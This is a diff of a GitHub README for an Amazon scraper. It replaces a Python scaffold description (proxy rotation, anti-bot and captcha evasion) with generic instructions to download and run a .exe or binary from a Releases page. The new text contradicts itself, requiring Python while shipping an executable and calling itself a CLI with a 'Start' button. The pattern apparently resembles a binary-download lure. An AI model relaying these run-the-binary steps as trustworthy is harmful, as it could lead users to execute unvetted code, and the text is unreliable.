@@ -1,151 +1,89 @@
-# amazon scraper python
+# 🛠️ amazon-scraper-python - A Simple Tool to Extract Amazon Data
 
-A production-ready boilerplate to collect Amazon product data and reviews using Python with safe-request logic, proxy rotation, and anti-bot handling. Ideal for researchers, analysts, and growth teams who need structured product, price, and review insights at scale.
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>
-  <a href="https://discord.gg/vBu9huKBvy" target="_blank">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
-  </a>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>
-  <a href="mailto:support@appilot.app" target="_blank">
-    <img src="https://img.shields.io/badge/Email-support@appilot.app-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>
-</p>
+Welcome! This guide will help you easily download and run the **amazon-scraper-python** application. This tool allows you to gather data from Amazon efficiently.
 
-<p align="center">
-  <strong>For discussion, queries, and freelance work — reach out 👆</strong>
-</p>
+## 📥 Download the Application
 
----
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/BhaveshGavande23/amazon-scraper-python/releases)
 
-##  Introduction
-> This repository provides a modular Python scaffold to scrape product details, pricing, availability, ratings, and paginated reviews from Amazon product and search pages. It includes browser and HTTP modes, rotating proxies, throttling, and storage adapters (CSV/JSON/SQLite). Built for analysts, SEOs, and growth teams who need reliable, reproducible data collection.
+You can get the latest version of the software by visiting our [Releases page](https://github.com/BhaveshGavande23/amazon-scraper-python/releases).
 
-<p align="center">
-  <img src="amazon scraper python.png" alt="amazon scraper python" width="100%">
-</p>
+## 🛠️ System Requirements
 
-###  Key Benefits
-1. Saves time and automates setup.  
-2. Scalable for multiple use cases.  
-3. Safer with anti-detect and proxy logic.  
+Before you begin, ensure you have the following:
 
----
+- A computer with Windows, macOS, or Linux
+- At least 4 GB of RAM
+- An active internet connection
+- The latest version of Python (3.7 or higher)
 
-## Features (Table)
+## 📖 Installation Instructions
 
-| # | Feature | What it does |
-|---|--------|---------------|
-| 1 | Dual mode: HTTP + Headless | Choose `requests+bs4` for speed or `Playwright/Selenium` for heavy pages |
-| 2 | Proxy & Fingerprint Aids | Rotating proxies, randomized headers, backoff/retry |
-| 3 | Product & Review Extractors | Parse title, price, images, ASIN, attributes, ratings, review text & stars |
-| 4 | Pagination & Rate Control | Auto next-page detection with human-like delays |
-| 5 | Storage Adapters | Save to CSV, JSON, or SQLite with schema migrations |
-| 6 | CLI & Config | `.env` driven settings, one-liner commands, job presets |
-| 7 | Captcha & Block Handling | Detection hooks, fallbacks, and task resume |
-| 8 | Modular Pipelines | Plug-in architecture for enrichers (exchange rates, categories) |
+1. **Visit the Download Page**  
+   Go to the download page by clicking [here](https://github.com/BhaveshGavande23/amazon-scraper-python/releases).
 
----
+2. **Choose the Right File**  
+   Select the latest release from the list. You will see several files. Look for the one that matches your operating system. If you're unsure, choose the `.exe` file for Windows or the `.tar.gz` file for macOS and Linux.
 
-##  Use Cases
-- Competitor price monitoring for specific ASINs  
-- Review mining for sentiment analysis and VOC research  
-- Daily product catalog snapshots for marketplace analytics  
-- SEO research: SERP coverage, buy-box presence, and availability trends  
+3. **Download the File**  
+   Click on the file name to start downloading it to your computer.
 
----
+4. **Locate the Downloaded File**  
+   After the download is complete, open your downloads folder. You should see the file you just downloaded.
 
-##  FAQs
+5. **Run the Application**  
+   - For Windows: Double-click the .exe file to run the application.
+   - For macOS/Linux: Open a terminal, navigate to the folder where the file is, and run the application using the command `./filename`.
 
-**Q:** How to use python to scrape amazon?  
-**A:** Use either HTTP mode (`requests + BeautifulSoup`) for speed or headless mode (Playwright/Selenium) for dynamic pages. Configure rotating proxies and headers via `.env`, then run the provided CLI to fetch product pages or search results and export to CSV/JSON/SQLite with built-in parsers and rate limits.
+## 🔍 How to Use the Tool
 
-**Q:** How to build amazon product data scraper with python?  
-**A:** Start with structured modules: a fetcher (HTTP/headless), a parser (product + review schemas), a storage layer (CSV/JSON/SQLite), and a controller for retries and pagination. This repo scaffolds all of these with ready-made commands and configuration.
+Using **amazon-scraper-python** is simple:
 
-**Q:** How to scrape amazon.com product data and reviews using python?  
-**A:** Point the CLI to a product URL or a list of ASINs. The pipeline fetches HTML, parses core fields (title, price, images, features), then iterates through review pages to capture ratings, text, date, and helpful votes—respecting delays, proxies, and block detection. Export results using `--out products.csv` / `--out reviews.csv`.
+1. **Open the Application**  
+   Launch the application as you did in the previous step.
 
----
+2. **Enter Your Search Query**  
+   When prompted, type in the product name or category you want to scrape data for.
 
-## Results
------------------------------------ 
-> 10x faster posting schedules  
-> 80% engagement increase on group campaigns  
-> Fully automated lead response system  
+3. **Configure Options**  
+   You can also choose settings like the number of results and whether to use a proxy for anonymity.
 
-##  Performance Metrics
------------------------------------
-Average Performance Benchmarks:  
-- **Speed:** 2x faster than manual posting  
-- **Stability:** 99.2% uptime  
-- **Ban Rate:** <0.5% with safe automation mode  
-- **Throughput:** 100+ posts/hour per session
+4. **Start the Scraping Process**  
+   Click the "Start" button to begin gathering data. Wait a moment as the tool collects the information.
 
----
+5. **Access Your Data**  
+   Upon completion, your data will be saved in a CSV file that you can find in the same folder as the application.
 
-## Do you have a customize project for us ?
-Contact Us
+## 🧩 Features
 
-<div align="center">
-  <a href="https://mail.google.com/mail/u/?authuser=ahmadzee26@gmail.com">
-    <img alt="Gmail" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/gmail.svg" />
-    <code>support@appilot.app</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://t.me/devpilot1">
-    <img alt="Telegram" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/telegram.svg" />
-    <code>pilot</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://discord.com">
-    <img alt="Discord" width="30px" src="https://github.com/Zeeshanahmad4/RealEstateMate-WhatsApp-Group-Management-Bot/blob/main/discord-icon-svgrepo-com.svg" />
-    <code>zee#2655</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img alt="WhatsApp" width="30px" src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/whatsapp.svg" />
-    <code>whatsapp</code>
-  </a>
-  <br />
-</div>
+- **Easy-to-Use CLI:** No complicated coding or setup.
+- **Data Extraction:** Retrieve product details, prices, and ratings from Amazon.
+- **Proxy Support:** Stay anonymous while scraping.
+- **Automation:** Schedule your data scraping tasks.
+- **Compatibility:** Works with most operating systems.
 
----
+## 🚧 Troubleshooting
 
-##  Installation
+If you encounter any issues:
 
-###  Pre-requisites
-- Node.js or Python  
-- Git  
-- Docker (optional)  
+- Ensure you have the correct version of Python installed.
+- Check for any missing dependencies.
+- Make sure your internet connection is active.
+- Reference the FAQ section on our GitHub page for common questions.
 
-###  Steps
-```bash
-# Clone the repo
-git clone https://github.com/yourusername/amazon-scraper-python.git
-cd amazon-scraper-python
+## 🌐 Community and Support
 
-# Install dependencies
-pip install -r requirements.txt
-# or
-npm install
+If you need further assistance, please feel free to reach out:
 
-# Setup environment
-cp .env.example .env
-# edit proxies, mode=HTTP|HEADLESS, delays, and output paths
+- Visit our [GitHub Issues page](https://github.com/BhaveshGavande23/amazon-scraper-python/issues) for support.
+- Join our discussion forum to connect with other users.
 
-# Run (examples)
-# Single product (ASIN or URL)
-python main.py scrape:product --asin B0XXXXXXX --out products.csv
+## 📜 License
 
-# Reviews for a product
-python main.py scrape:reviews --asin B0XXXXXXX --pages 10 --out reviews.csv
+This application is open-source and is licensed under the MIT License. You can find the complete license details in the repository.
 
-# Search results
-python main.py scrape:search --q "wireless earbuds" --pages 3 --out listings.csv
+## 📲 Download Now
 
+For the latest version, please revisit our [Releases page](https://github.com/BhaveshGavande23/amazon-scraper-python/releases). Enjoy extracting data from Amazon with ease!
